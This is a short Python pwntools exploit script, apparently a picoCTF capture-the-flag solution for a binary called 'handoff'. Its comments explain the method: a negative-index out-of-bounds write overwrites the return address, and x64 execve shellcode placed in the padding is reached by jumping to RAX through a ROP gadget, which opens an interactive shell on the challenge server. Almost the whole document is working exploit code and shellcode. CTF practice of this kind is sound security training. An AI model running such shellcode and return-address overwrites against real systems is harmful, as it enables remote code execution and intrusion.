# made by mel

#basically:
#	program has an out of bounds array read error (can specify negative vals)
#	using this, i was able to overwrite the return address
#	we use a ROP gadget, since at this point in execution, register RAX stores the address we wrote to
#	if we write shellcode as the padding to the return address, then when jumping to RAX, we execute it
#	thus, our exploit unintentionally corrupts the memory and makes the rest of the program broken, but we get a shell from it
#	all of this without the need to even leak stack addresses (my original method)


from pwn import *

context.binary = ELF("./handoff")

#make sure ur shellcode matches the architecture of the binary :3
# x64
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
print(len(shellcode))
assert(len(shellcode) <= 40)

#with process(["./handoff"]) as p:
with remote("shape-facility.picoctf.net", 60599) as p:
	#utilize option 2 to write the return addresses
	#stdio functions break due to this
	def perform_rop(addrs):
		#go back to the main function
		addrs.append(context.binary.sym["main"]+8)

		#generate the payload
		payl = shellcode+b"\x90"*(40-len(shellcode))
		for addr in addrs:
			payl += p64(addr)

		#write
		p.sendlineafter(b"app\n", b"2")
		p.sendlineafter(b"to?\n", b"-1")
		p.sendlineafter(b"them?\n", payl)

	#get a leak of the stack address
	perform_rop([
		0x000000000040116c #jump to rax
	])
	p.interactive()

	#rax will have our shellcode stored within it, we will jump to that